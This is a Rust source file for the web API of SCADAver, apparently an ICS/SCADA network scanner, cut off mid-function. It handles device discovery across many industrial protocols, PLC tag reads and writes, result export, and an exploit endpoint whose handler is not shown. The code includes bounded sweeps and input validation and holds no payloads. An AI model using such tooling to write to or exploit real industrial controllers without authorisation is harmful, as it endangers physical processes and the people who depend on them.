use axum::{
    extract::{
        ws::{Message, WebSocket, WebSocketUpgrade},
        Path, Query, State,
    },
    http::{header, HeaderMap, StatusCode},
    response::{Html, IntoResponse, Response},
    routing::{delete, get, post},
    Json, Router,
};
use serde::{Deserialize, Serialize};
use serde_json::{json, Map, Value};
use std::fmt::Write as _;
use std::net::Ipv4Addr;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::broadcast;
use tokio::time::sleep;

// ─── Embedded static files ────────────────────────────────────────────────────

const INDEX_HTML: &str = include_str!("static/index.html");
const APP_JS: &str = include_str!("static/app.js");
const STYLE_CSS: &str = include_str!("static/style.css");

// ─── Request types ────────────────────────────────────────────────────────────

#[derive(Deserialize)]
struct ScanIpReq {
    ip: String,
    #[serde(default = "default_timeout")]
    timeout: u64,
}

#[derive(Deserialize)]
struct ScanNetworkReq {
    /// `vendor` is retained for the existing UI; `protocol` is the clearer
    /// public API spelling for new callers and browser tests.
    #[serde(default, alias = "protocol")]
    vendor: String,
    #[serde(default = "default_timeout")]
    timeout: u64,
    #[serde(default)]
    iface_ip: String,
    #[serde(default)]
    target_cidr: String,
    /// Reserved for protocol-specific network probes.  The generic Casket probe
    /// API currently uses each protocol's default port, so a supplied value is
    /// validated and rejected until the selected protocol wires it through.
    #[serde(default)]
    target_port: Option<u16>,
    /// `WebVisit` uses HTTP independently from the `ProConOS` device-information
    /// service. This is an explicit endpoint for later read-only tag queries;
    /// the scanner never probes it.
    #[serde(default)]
    webvisit_port: Option<u16>,
    /// eWON IPCONF discovery and its Web/API tag endpoint are independent.
    /// This is saved for later read-only GET /api/tags/ requests and is never
    /// contacted as part of IPCONF discovery.
    #[serde(default)]
    web_port: Option<u16>,
    /// SNMP reads are sent only with this operator-supplied community. The web
    /// scanner never tries the built-in common-community list.
    #[serde(default)]
    snmp_community: Option<String>,
}

#[derive(Deserialize, Serialize)]
struct DeviceReq {
    ip: String,
    vendor: String,
    #[serde(default)]
    fields: Value,
}

#[derive(Deserialize)]
struct TagsReq {
    ip: String,
    vendor: String,
    #[serde(default)]
    cache: bool,
    #[serde(default)]
    username: Option<String>,
    #[serde(default)]
    password: Option<String>,
}

#[derive(Deserialize)]
struct WriteReq {
    ip: String,
    vendor: String,
    tag: String,
    value: String,
    /// CIP type code, sent by the UI when writing a Logix tag or UDT member. Without it
    /// the driver cannot know how to encode the text, so Rockwell writes require it.
    #[serde(default)]
    type_code: Option<u16>,
    #[serde(default)]
    username: Option<String>,
    #[serde(default)]
    password: Option<String>,
}

#[derive(Deserialize)]
struct HistoryQuery {
    ip: String,
    vendor: String,
}

#[derive(Deserialize)]
struct ExploitReq {
    ip: String,
    #[serde(default)]
    username: String,
    #[serde(default)]
    password: String,
    /// Protocol port from the scan DB.  0 means "use protocol default".
    #[serde(default)]
    port: u16,
}

#[derive(Deserialize)]
struct MonitorQuery {
    #[serde(default)]
    vendor: String,
    #[serde(default)]
    key: String,
}

#[derive(Deserialize, Default)]
struct WebSocketAuthQuery {
    #[serde(default)]
    key: String,
}

#[derive(Deserialize)]
struct PortscanReq {
    ip: String,
    #[serde(default = "default_timeout")]
    timeout: u64,
    #[serde(default)]
    extra_ports: Vec<u16>,
}

fn default_timeout() -> u64 {
    5
}

/// Opt-in harness mode for browser and API tests. It intentionally exposes a
/// synthetic loopback adapter and rejects every non-loopback target, so test
/// processes cannot reach a user's OT or corporate network.
fn test_loopback_mode() -> bool {
    std::env::var(TEST_LOOPBACK_ENV).as_deref() == Ok("1")
}

fn test_loopback_interface() -> casket::core::network::NetworkInterface {
    casket::core::network::NetworkInterface {
        name: "SCADAver test loopback".to_string(),
        ip: TEST_LOOPBACK_IP.to_string(),
        netmask: "255.255.255.255".to_string(),
    }
}

fn web_interfaces() -> Vec<casket::core::network::NetworkInterface> {
    if test_loopback_mode() {
        vec![test_loopback_interface()]
    } else {
        casket::core::network::get_interfaces()
    }
}

fn validate_optional_port(port: Option<u16>, field_name: &str) -> Result<(), String> {
    if matches!(port, Some(0)) {
        return Err(format!("{field_name} must be between 1 and 65535"));
    }
    Ok(())
}

fn validate_test_loopback_ip(ip: &str, test_mode: bool) -> Result<(), String> {
    if test_mode && ip != TEST_LOOPBACK_IP {
        return Err(format!(
            "{TEST_LOOPBACK_ENV}=1 only permits the loopback target {TEST_LOOPBACK_IP}"
        ));
    }
    Ok(())
}

fn validate_test_loopback_scan_scope(
    iface_ip: &str,
    target_cidr: &str,
    test_mode: bool,
) -> Result<(), String> {
    if !test_mode {
        return Ok(());
    }
    validate_test_loopback_ip(iface_ip, true)?;
    if !target_cidr.trim().is_empty() && target_cidr.trim() != TEST_LOOPBACK_CIDR {
        return Err(format!(
            "{TEST_LOOPBACK_ENV}=1 only permits the loopback subnet {TEST_LOOPBACK_CIDR}"
        ));
    }
    Ok(())
}

/// A Modbus TCP sweep is intentionally bounded: a broad range can generate disruptive
/// connection volume on an OT network. Operators can supply a smaller explicit CIDR.
const MAX_MODBUS_SWEEP_HOSTS: usize = 1_024;
/// A protocol-specific subnet sweep is more expensive than the single Modbus request
/// used above, so keep it intentionally smaller by default.
const MAX_PROTOCOL_SWEEP_HOSTS: usize = 256;
const TEST_LOOPBACK_ENV: &str = "SCADAVER_TEST_LOOPBACK";
const TEST_LOOPBACK_IP: &str = "127.0.0.1";
const TEST_LOOPBACK_CIDR: &str = "127.0.0.1/32";
const PHOENIX_INFO_PORT: u16 = 1962;
const PHOENIX_WEBVISIT_PORT: u16 = 80;
const EWON_WEB_PORT: u16 = 80;

// ─── Shared router state ──────────────────────────────────────────────────────

/// Event broadcast over `/ws/events` to connected browser clients.
#[derive(Clone, Serialize)]
pub struct DeviceEvent {
    pub event: &'static str,
    pub ip: String,
    pub vendor: Option<String>,
    pub message: Option<String>,
}

pub struct AppState {
    pub api_key: String,
    pub events_tx: broadcast::Sender<DeviceEvent>,
}

// ─── Router ───────────────────────────────────────────────────────────────────

pub fn build_router(api_key: String) -> Router {
    let (events_tx, _) = broadcast::channel::<DeviceEvent>(256);
    let state = Arc::new(AppState { api_key, events_tx });
    Router::new()
        .route("/", get(index_html))
        .route("/static/app.js", get(app_js))
        .route("/static/style.css", get(style_css))
        .route("/health", get(health))
        .route("/api/interfaces", get(api_interfaces))
        .route("/api/protocols", get(api_protocols))
        .route("/api/devices", get(api_list_devices).post(api_save_device))
        .route("/api/devices/:ip", delete(api_delete_device))
        .route("/api/scan", post(api_scan))
        .route("/api/scan/ip", post(api_scan_ip))
        .route("/api/device/tags", post(api_device_tags))
        .route("/api/device/write", post(api_device_write))
        .route("/api/device/history", get(api_device_history))
        .route("/api/ewon/tags", get(api_ewon_tags))
        .route("/api/schneider/info", get(api_schneider_info))
        .route("/api/exploit/*id", post(api_exploit))
        .route("/api/export", get(api_export))
        .route("/api/run/portscan", post(api_portscan))
        .route("/ws/monitor/:ip", get(ws_monitor))
        .route("/ws/events", get(ws_events))
        .with_state(state)
}

/// Look up a single string field from the stored device record for `ip`.
/// Returns `None` if the device is not in the DB or the field is absent/non-string.
fn device_field_str(ip: &str, key: &str) -> Option<String> {
    let db = crate::db::Database::open(&crate::db::Database::default_path()).ok()?;
    let devices = db.load_devices().ok()?;
    let dev = devices.into_iter().find(|d| d.ip == ip)?;
    dev.fields[key].as_str().map(str::to_string)
}

fn device_field_u16(ip: &str, key: &str) -> Option<u16> {
    let db = crate::db::Database::open(&crate::db::Database::default_path()).ok()?;
    let devices = db.load_devices().ok()?;
    let dev = devices.into_iter().find(|device| device.ip == ip)?;
    json_field_u16(&dev.fields, key)
}

fn json_field_u16(fields: &Value, key: &str) -> Option<u16> {
    fields[key]
        .as_u64()
        .and_then(|value| u16::try_from(value).ok())
        .or_else(|| fields[key].as_str()?.parse().ok())
}

fn device_enip_port(ip: &str) -> u16 {
    device_field_u16(ip, "enip_port")
        .or_else(|| device_field_u16(ip, "port"))
        .unwrap_or(44_818)
}

/// Return the SLMP TCP port saved with a Mitsubishi discovery result. The
/// protocol-specific field takes precedence so generic metadata cannot redirect
/// a later live tag read.
fn device_mitsubishi_port(ip: &str) -> u16 {
    device_field_u16(ip, "slmp_port")
        .or_else(|| device_field_u16(ip, "port"))
        .unwrap_or(casket::vendors::mitsubishi::slmp::DEFAULT_PORT)
}

/// Return the FINS/TCP endpoint saved with an Omron discovery result. The
/// protocol-specific field takes precedence so a generic metadata value cannot
/// redirect a later read-only DM query.
fn device_fins_port(ip: &str) -> u16 {
    device_field_u16(ip, "fins_port")
        .or_else(|| device_field_u16(ip, "port"))
        .unwrap_or(casket::vendors::omron::fins::FINS_TCP_PORT)
}

/// `WebVisit`'s HTTP endpoint is deliberately independent from the `ProConOS`
/// device-info service. In particular, never fall back to the generic `port`
/// field here: a persisted high `ProConOS` port is not an HTTP tag endpoint.
fn device_phoenix_webvisit_port(ip: &str) -> u16 {
    let Ok(db) = crate::db::Database::open(&crate::db::Database::default_path()) else {
        return PHOENIX_WEBVISIT_PORT;
    };
    let fields = match db
        .load_devices()
        .ok()
        .and_then(|devices| devices.into_iter().find(|device| device.ip == ip))
    {
        Some(device) => device.fields,
        None => return PHOENIX_WEBVISIT_PORT,
    };
    phoenix_webvisit_port_from_fields(&fields)
}

fn phoenix_webvisit_port_from_fields(fields: &Value) -> u16 {
    ["webvisit_port", "http_port", "web_port"]
        .iter()
        .find_map(|key| json_field_u16(fields, key))
        .unwrap_or(PHOENIX_WEBVISIT_PORT)
}

/// eWON's UDP IPCONF port is discovery metadata, not the HTTP service used to
/// read tags. Never use a generic `port` field here or a high IPCONF port could
/// be mistaken for the web endpoint.
fn device_ewon_web_port(ip: &str) -> u16 {
    let Ok(db) = crate::db::Database::open(&crate::db::Database::default_path()) else {
        return EWON_WEB_PORT;
    };
    db.load_devices()
        .ok()
        .and_then(|devices| devices.into_iter().find(|device| device.ip == ip))
        .and_then(|device| {
            ["ewon_web_port", "web_port", "http_port"]
                .iter()
                .find_map(|key| json_field_u16(&device.fields, key))
        })
        .unwrap_or(EWON_WEB_PORT)
}

fn device_iec104_port(ip: &str) -> u16 {
    device_field_u16(ip, "iec104_port")
        .or_else(|| device_field_u16(ip, "port"))
        .unwrap_or(casket::vendors::iec104::client::IEC104_PORT)
}

fn device_snmp_port(ip: &str) -> u16 {
    device_field_u16(ip, "snmp_port")
        .or_else(|| device_field_u16(ip, "port"))
        .unwrap_or(casket::vendors::snmp::client::SNMP_PORT)
}

fn device_mqtt_port(ip: &str) -> u16 {
    device_field_u16(ip, "mqtt_port")
        .or_else(|| device_field_u16(ip, "port"))
        .unwrap_or(casket::vendors::mqtt::client::MQTT_PORT)
}

fn device_opcua_port(ip: &str) -> u16 {
    device_field_u16(ip, "opcua_port")
        .or_else(|| device_field_u16(ip, "port"))
        .unwrap_or(casket::vendors::opcua::client::OPCUA_PORT)
}

fn device_dnp3_port(ip: &str) -> u16 {
    device_field_u16(ip, "dnp3_port")
        .or_else(|| device_field_u16(ip, "port"))
        .unwrap_or(casket::vendors::dnp3::client::DNP3_PORT)
}

fn device_bacnet_port(ip: &str) -> u16 {
    device_field_u16(ip, "bacnet_port")
        .or_else(|| device_field_u16(ip, "port"))
        .unwrap_or(casket::vendors::bacnet::client::BACNET_PORT)
}

/// `RockwellDevice::vendor` is derived from the parsed CIP identity vendor ID.
/// Only promote the UI's protocol category when that identity explicitly maps
/// to Rockwell's registered vendor ID 1; every other EtherNet/IP identity stays
/// generic rather than being attributed by protocol alone.
fn enip_web_vendor(identity_vendor: &str) -> (&'static str, Option<u16>) {
    if identity_vendor == "Rockwell Automation / Allen-Bradley" {
        ("rockwell", Some(1))
    } else {
        ("enip", None)
    }
}

// When `key` is empty the server runs in no-auth mode: every request is accepted.
// This is intentional for local/isolated deployments; pass a non-empty key in production.
fn join_err(e: &tokio::task::JoinError) -> String {
    if e.is_panic() {
        "internal error".to_string()
    } else {
        e.to_string()
    }
}

fn require_api_key(
    headers: &HeaderMap,
    key: &str,
) -> Option<(StatusCode, Json<serde_json::Value>)> {
    use subtle::ConstantTimeEq as _;
    let provided = headers
        .get("x-api-key")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("");
    if provided.as_bytes().ct_eq(key.as_bytes()).into() {
        None
    } else {
        Some((
            StatusCode::UNAUTHORIZED,
            Json(serde_json::json!({"error": "missing or invalid X-API-Key header"})),
        ))
    }
}

fn require_api_key_or_query(
    headers: &HeaderMap,
    query_key: &str,
    expected_key: &str,
) -> Option<(StatusCode, Json<serde_json::Value>)> {
    use subtle::ConstantTimeEq as _;
    let header_key = headers
        .get("x-api-key")
        .and_then(|value| value.to_str().ok())
        .unwrap_or("");
    let header_valid: bool = header_key.as_bytes().ct_eq(expected_key.as_bytes()).into();
    let query_valid: bool = query_key.as_bytes().ct_eq(expected_key.as_bytes()).into();
    if header_valid || query_valid {
        None
    } else {
        Some((
            StatusCode::UNAUTHORIZED,
            Json(json!({"error": "missing or invalid API key"})),
        ))
    }
}

fn bad_request(message: impl Into<String>) -> Response {
    (
        StatusCode::BAD_REQUEST,
        Json(json!({"error": message.into()})),
    )
        .into_response()
}

fn validate_ipv4(value: &str, field_name: &str) -> Result<Ipv4Addr, String> {
    value
        .trim()
        .parse::<Ipv4Addr>()
        .map_err(|_| format!("{field_name} must be a valid IPv4 address, for example 10.2.10.25"))
}

fn validate_ipv4_cidr(value: &str) -> Result<(), String> {
    let value = value.trim();
    if value.is_empty() {
        return Ok(());
    }

    if !value.contains('/') {
        return Err(
            "Target subnet must use IPv4 CIDR notation, for example 10.2.10.0/24".to_string(),
        );
    }

    let network = value
        .parse::<ipnetwork::IpNetwork>()
        .map_err(|_| "Target subnet must be an IPv4 CIDR, for example 10.2.10.0/24".to_string())?;
    if matches!(network, ipnetwork::IpNetwork::V4(_)) {
        Ok(())
    } else {
        Err("Target subnet must be an IPv4 CIDR, for example 10.2.10.0/24".to_string())
    }
}

fn interface_network_cidr(ip: &str, netmask: &str) -> anyhow::Result<String> {
    let ip = validate_ipv4(ip, "Interface IP").map_err(anyhow::Error::msg)?;
    let netmask = validate_ipv4(netmask, "Interface netmask").map_err(anyhow::Error::msg)?;
    let mask = u32::from_be_bytes(netmask.octets());
    let prefix = mask.leading_ones();
    let expected_mask = if prefix == 0 {
        0
    } else {
        u32::MAX << (32 - prefix)
    };
    if mask != expected_mask {
        anyhow::bail!("Interface {ip} has a non-contiguous netmask {netmask}");
    }
    let network = u32::from_be_bytes(ip.octets()) & mask;
    Ok(format!("{}/{}", Ipv4Addr::from(network), prefix))
}

fn subnet_sweep_hosts(
    target_cidr: &str,
    iface: &casket::core::network::NetworkInterface,
    maximum_hosts: usize,
    operation: &str,
) -> anyhow::Result<(String, Vec<String>)> {
    use ipnetwork::IpNetwork;

    if !target_cidr.trim().is_empty() && !target_cidr.trim().contains('/') {
        anyhow::bail!("Target subnet must use IPv4 CIDR notation, for example 10.2.10.0/24");
    }

    let cidr = if target_cidr.trim().is_empty() {
        interface_network_cidr(&iface.ip, &iface.netmask)?
    } else {
        target_cidr.trim().to_string()
    };
    let network = cidr.parse::<IpNetwork>().map_err(|_| {
        anyhow::anyhow!("Target subnet must be an IPv4 CIDR, for example 10.2.10.0/24")
    })?;
    if !matches!(network, IpNetwork::V4(_)) {
        anyhow::bail!("Target subnet must be an IPv4 CIDR, for example 10.2.10.0/24");
    }

    let network_address = network.network();
    let broadcast_address = network.broadcast();
    let is_single_host = network_address == broadcast_address;
    let mut hosts = Vec::new();
    for ip in &network {
        if !is_single_host && (ip == network_address || ip == broadcast_address) {
            continue;
        }
        if !matches!(ip, std::net::IpAddr::V4(_)) {
            continue;
        }
        hosts.push(ip.to_string());
        if hosts.len() > maximum_hosts {
            anyhow::bail!(
                "{operation} for {cidr} exceeds the {maximum_hosts}-host limit; choose a smaller explicit CIDR"
            );
        }
    }
    if hosts.is_empty() {
        anyhow::bail!("Target subnet {cidr} has no usable IPv4 host addresses");
    }
    Ok((cidr, hosts))
}

fn modbus_sweep_hosts(
    target_cidr: &str,
    iface: &casket::core::network::NetworkInterface,
) -> anyhow::Result<(String, Vec<String>)> {
    subnet_sweep_hosts(target_cidr, iface, MAX_MODBUS_SWEEP_HOSTS, "Modbus sweep")
}

fn protocol_sweep_hosts(
    target_cidr: &str,
    iface: &casket::core::network::NetworkInterface,
) -> anyhow::Result<(String, Vec<String>)> {
    subnet_sweep_hosts(
        target_cidr,
        iface,
        MAX_PROTOCOL_SWEEP_HOSTS,
        "Protocol subnet scan",
    )
}

fn selected_interface(
    interfaces: Vec<casket::core::network::NetworkInterface>,
    iface_ip: &str,
) -> anyhow::Result<casket::core::network::NetworkInterface> {
    if iface_ip.is_empty() {
        return interfaces
            .into_iter()
            .next()
            .ok_or_else(|| anyhow::anyhow!("No network interfaces found"));
    }
    interfaces
        .into_iter()
        .find(|interface| interface.ip == iface_ip)
        .ok_or_else(|| anyhow::anyhow!("Interface {iface_ip} not found"))
}

// ─── Static files ─────────────────────────────────────────────────────────────

async fn index_html() -> Html<&'static str> {
    Html(INDEX_HTML)
}

async fn app_js() -> impl IntoResponse {
    (
        [(
            header::CONTENT_TYPE,
            "application/javascript; charset=utf-8",
        )],
        APP_JS,
    )
}

async fn style_css() -> impl IntoResponse {
    (
        [(header::CONTENT_TYPE, "text/css; charset=utf-8")],
        STYLE_CSS,
    )
}

async fn health() -> Json<Value> {
    Json(json!({"status": "ok", "version": env!("CARGO_PKG_VERSION")}))
}

// ─── Interfaces ───────────────────────────────────────────────────────────────

async fn api_interfaces(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> impl IntoResponse {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    let ifaces = tokio::task::spawn_blocking(web_interfaces)
        .await
        .unwrap_or_default();

    let list: Vec<Value> = ifaces
        .iter()
        .map(|i| json!({"name": i.name, "ip": i.ip, "netmask": i.netmask}))
        .collect();
    Json(json!({"interfaces": list})).into_response()
}

/// Protocol choices exposed by the web scanner. The built-in portion comes directly
/// from Casket so new core protocols cannot silently disappear from the web UI.
fn web_protocols() -> Vec<Value> {
    let mut protocols: Vec<Value> = casket::core::autodetect::builtin_protocols()
        .into_iter()
        .map(|protocol| {
            json!({
                "slug": protocol.slug,
                "label": protocol.label,
                "transport": protocol.transport,
                "scan_mode": "builtin",
            })
        })
        .collect();
    protocols.push(json!({
        "slug": "modbus",
        "label": "Modbus TCP",
        "transport": "TCP 502",
        "scan_mode": "modbus",
    }));
    protocols
}

fn is_web_protocol(vendor: &str) -> bool {
    vendor.is_empty()
        || vendor == "all"
        || vendor == "modbus"
        || vendor == "fins"
        // `enip` is the catalog slug while `rockwell` remains a supported
        // convenience alias for a confirmed Rockwell EtherNet/IP identity.
        || vendor == "rockwell"
        || casket::core::autodetect::builtin_protocols()
            .iter()
            .any(|protocol| protocol.slug == vendor)
}

/// Keep non-default ports opt-in and narrowly scoped. A port override changes
/// where traffic is sent, so each protocol must explicitly implement one
/// before the web scanner accepts it.
fn protocol_supports_scan_port_override(vendor: &str) -> bool {
    matches!(
        vendor,
        "bacnet"
            | "dnp3"
            | "modbus"
            | "schneider"
            | "modicon"
            | "siemens"
            | "s7"
            | "beckhoff"
            | "ads"
            | "enip"
            | "rockwell"
            | "mitsubishi"
            | "omron"
            | "fins"
            | "phoenix"
            | "ewon"
            | "iec104"
            | "snmp"
            | "mqtt"
            | "opcua"
    )
}

async fn api_protocols(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> impl IntoResponse {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    Json(json!({"protocols": web_protocols()})).into_response()
}

// ─── Device persistence ───────────────────────────────────────────────────────

async fn api_list_devices(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> impl IntoResponse {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    let result = tokio::task::spawn_blocking(|| {
        let db = crate::db::Database::open(&crate::db::Database::default_path())?;
        db.load_devices()
    })
    .await;

    let Ok(Ok(devices)) = result else {
        return Json(json!({"devices": []})).into_response();
    };

    let list: Vec<Value> = devices
        .iter()
        .map(|d| {
            json!({
                "id": d.id,
                "ip": d.ip,
                "vendor": d.vendor,
                "last_seen": d.last_seen,
                "fields": d.fields,
            })
        })
        .collect();
    Json(json!({"devices": list})).into_response()
}

#[derive(Deserialize, Default)]
struct ExportQuery {
    format: Option<String>,
}

async fn api_export(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(q): Query<ExportQuery>,
) -> impl IntoResponse {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }

    let result = tokio::task::spawn_blocking(|| {
        let db = crate::db::Database::open(&crate::db::Database::default_path())?;
        db.load_devices()
    })
    .await;

    let devices = match result {
        Ok(Ok(d)) => d,
        Ok(Err(e)) => {
            return (
                StatusCode::INTERNAL_SERVER_ERROR,
                Json(serde_json::json!({"error": e.to_string()})),
            )
                .into_response();
        }
        Err(e) => {
            return (
                StatusCode::INTERNAL_SERVER_ERROR,
                Json(serde_json::json!({"error": join_err(&e)})),
            )
                .into_response();
        }
    };

    let is_csv = q
        .format
        .as_deref()
        .is_some_and(|f| f.eq_ignore_ascii_case("csv"));

    if is_csv {
        let mut lines = vec!["ip,vendor,last_seen,fields".to_string()];
        for d in &devices {
            let fields_inline = d.fields.to_string().replace('"', "\"\"");
            lines.push(format!(
                "{},{},{},\"{}\"",
                d.ip, d.vendor, d.last_seen, fields_inline
            ));
        }
        let body = lines.join("\n");
        return (
            StatusCode::OK,
            [
                (header::CONTENT_TYPE, "text/csv"),
                (
                    header::CONTENT_DISPOSITION,
                    "attachment; filename=\"scadaver-export.csv\"",
                ),
            ],
            body,
        )
            .into_response();
    }

    let epoch = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    let device_list: Vec<Value> = devices
        .iter()
        .map(|d| {
            json!({
                "ip": d.ip,
                "vendor": d.vendor,
                "last_seen": d.last_seen,
                "fields": d.fields,
            })
        })
        .collect();

    let payload = json!({
        "tool": "scadaver",
        "version": env!("CARGO_PKG_VERSION"),
        "exported_at": epoch,
        "source": "web",
        "devices": device_list,
        "output": [],
    });

    let body = match serde_json::to_string_pretty(&payload) {
        Ok(s) => s,
        Err(e) => return (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    };

    (
        StatusCode::OK,
        [
            (header::CONTENT_TYPE, "application/json"),
            (
                header::CONTENT_DISPOSITION,
                "attachment; filename=\"scadaver-export.json\"",
            ),
        ],
        body,
    )
        .into_response()
}

async fn api_save_device(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<DeviceReq>,
) -> Response {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    let ip = req.ip.clone();
    let vendor = req.vendor.clone();
    let fields = req.fields.clone();
    let result = tokio::task::spawn_blocking(move || {
        let db = crate::db::Database::open(&crate::db::Database::default_path())?;
        db.upsert_device(&ip, &vendor, &fields)
    })
    .await;

    match result {
        Ok(Ok(id)) => Json(json!({"success": true, "id": id})).into_response(),
        Ok(Err(e)) => Json(json!({"success": false, "error": e.to_string()})).into_response(),
        Err(e) => Json(json!({"success": false, "error": join_err(&e)})).into_response(),
    }
}

async fn api_delete_device(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Path(ip): Path<String>,
) -> Response {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    let result = tokio::task::spawn_blocking(move || {
        let db = crate::db::Database::open(&crate::db::Database::default_path())?;
        db.delete_device_by_ip(&ip)
    })
    .await;

    match result {
        Ok(Ok(())) => Json(json!({"success": true})).into_response(),
        Ok(Err(e)) => Json(json!({"success": false, "error": e.to_string()})).into_response(),
        Err(e) => Json(json!({"success": false, "error": join_err(&e)})).into_response(),
    }
}

// ─── Scan ─────────────────────────────────────────────────────────────────────

async fn api_scan_ip(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<ScanIpReq>,
) -> Response {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    if let Err(error) = validate_ipv4(&req.ip, "Probe IP") {
        return bad_request(error);
    }
    if let Err(error) = validate_test_loopback_ip(&req.ip, test_loopback_mode()) {
        return bad_request(error);
    }
    api_scan_ip_inner(req, state.events_tx.clone())
        .await
        .into_response()
}

async fn api_scan_ip_inner(
    req: ScanIpReq,
    events_tx: broadcast::Sender<DeviceEvent>,
) -> Json<Value> {
    let ip = req.ip.clone();
    let timeout = req.timeout.min(60);

    let detected =
        tokio::task::spawn_blocking(move || casket::core::autodetect::detect_device(&ip, timeout))
            .await
            .unwrap_or(None);

    match detected {
        Some(dev) => {
            let ip2 = dev.ip.clone();
            let vendor2 = dev.vendor.clone();
            let fields2 = serde_json::to_value(&dev.fields).unwrap_or_default();
            let _ = events_tx.send(DeviceEvent {
                event: "device_found",
                ip: dev.ip.clone(),
                vendor: Some(dev.vendor.clone()),
                message: None,
            });
            tokio::spawn(tokio::task::spawn_blocking(move || {
                if let Ok(db) = crate::db::Database::open(&crate::db::Database::default_path()) {
                    let _ = db.upsert_device(&ip2, &vendor2, &fields2);
                }
            }));

            let mut resp = Map::new();
            resp.insert("ip".into(), dev.ip.into());
            resp.insert("vendor".into(), dev.vendor.into());
            for (k, v) in &dev.fields {
                resp.insert(k.clone(), v.clone());
            }
            Json(Value::Object(resp))
        }
        None => Json(json!({"error": "No ICS device detected at that IP"})),
    }
}

async fn api_scan(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<ScanNetworkReq>,
) -> Response {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    if req.iface_ip.trim().is_empty() {
        return bad_request("Select an IPv4 interface before starting a network scan");
    }
    if let Err(error) = validate_ipv4(&req.iface_ip, "Selected interface") {
        return bad_request(error);
    }
    if let Err(error) = validate_ipv4_cidr(&req.target_cidr) {
        return bad_request(error);
    }
    if let Err(error) = validate_optional_port(req.target_port, "Target port") {
        return bad_request(error);
    }
    if let Err(error) = validate_optional_port(req.webvisit_port, "WebVisit HTTP port") {
        return bad_request(error);
    }
    if let Err(error) = validate_optional_port(req.web_port, "Web/API port") {
        return bad_request(error);
    }
    if let Err(error) =
        validate_test_loopback_scan_scope(&req.iface_ip, &req.target_cidr, test_loopback_mode())
    {
        return bad_request(error);
    }
    if !is_web_protocol(req.vendor.trim()) {
        return bad_request(format!("Unsupported scanner protocol: {}", req.vendor));
    }
    if req.target_port.is_some() && !protocol_supports_scan_port_override(&req.vendor) {
        return bad_request(
            "Network scan port overrides are currently available only for Modbus TCP, Schneider/Modicon TCP, Siemens S7, Mitsubishi SLMP, Beckhoff ADS, EtherNet/IP, Omron FINS, Phoenix Contact, and eWON IPCONF scans",
        );
    }
    if req.webvisit_port.is_some() && req.vendor.trim() != "phoenix" {
        return bad_request("WebVisit HTTP port is available only for Phoenix Contact scans");
    }
    if req.web_port.is_some() && req.vendor.trim() != "ewon" {
        return bad_request("Web/API port is available only for eWON scans");
    }
    if req.vendor.trim() == "snmp"
        && req
            .snmp_community
            .as_deref()
            .is_none_or(|community| community.trim().is_empty())
    {
        return bad_request("Enter an SNMP community for a read-only SNMP scan");
    }
    api_scan_inner(req).await.into_response()
}

async fn api_scan_inner(req: ScanNetworkReq) -> Json<Value> {
    let vendor = req.vendor.clone();
    let timeout = req.timeout.min(60);
    let iface_ip = req.iface_ip.clone();
    let target_cidr = req.target_cidr.clone();
    let target_port = req.target_port;
    let webvisit_port = req.webvisit_port;
    let web_port = req.web_port;
    let snmp_community = req.snmp_community;

    let result = tokio::task::spawn_blocking(move || {
        broadcast_scan(
            &vendor,
            timeout,
            &iface_ip,
            &target_cidr,
            target_port,
            webvisit_port,
            web_port,
            snmp_community,
        )
    })
    .await;

    match result {
        Ok(Ok(devices)) => Json(json!({"devices": devices})),
        Ok(Err(e)) => Json(json!({"error": e.to_string()})),
        Err(e) => Json(json!({"error": join_err(&e)})),
    }
}

#[allow(
    clippy::needless_pass_by_value,
    clippy::too_many_arguments,
    clippy::too_many_lines
)]
fn broadcast_scan(
    vendor: &str,
    timeout: u64,
    iface_ip: &str,
    target_cidr: &str,
    target_port: Option<u16>,
    webvisit_port: Option<u16>,
    web_port: Option<u16>,
    snmp_community: Option<String>,
) -> anyhow::Result<Vec<Value>> {
    let iface = selected_interface(web_interfaces(), iface_ip)?;
    broadcast_scan_on_interface(
        vendor,
        timeout,
        &iface,
        target_cidr,
        target_port,
        webvisit_port,
        web_port,
        snmp_community.as_deref(),
    )
}

#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
fn broadcast_scan_on_interface(
    vendor: &str,
    timeout: u64,
    iface: &casket::core::network::NetworkInterface,
    target_cidr: &str,
    target_port: Option<u16>,
    webvisit_port: Option<u16>,
    web_port: Option<u16>,
    snmp_community: Option<&str>,
) -> anyhow::Result<Vec<Value>> {
    let mut devices: Vec<Value> = Vec::new();

    let scan_beckhoff = matches!(vendor, "beckhoff" | "all" | "");
    let scan_enip = matches!(vendor, "enip" | "rockwell" | "all" | "");
    let scan_ewon = matches!(vendor, "ewon" | "all" | "");
    let scan_schneider = matches!(vendor, "schneider" | "modicon" | "all" | "");
    let scan_mitsubishi = matches!(vendor, "mitsubishi" | "all" | "");
    let scan_bacnet = matches!(vendor, "bacnet" | "all" | "");
    let scan_modbus_tcp = matches!(vendor, "modbus" | "all" | "");
    // Beckhoff UDP discovery uses a fixed port.  An explicit ADS port instead
    // selects a bounded direct scan that confirms the ADS/TCP endpoint with a
    // read-only ReadState request.
    let scan_beckhoff_tcp = matches!(vendor, "beckhoff" | "ads") && target_port.is_some();
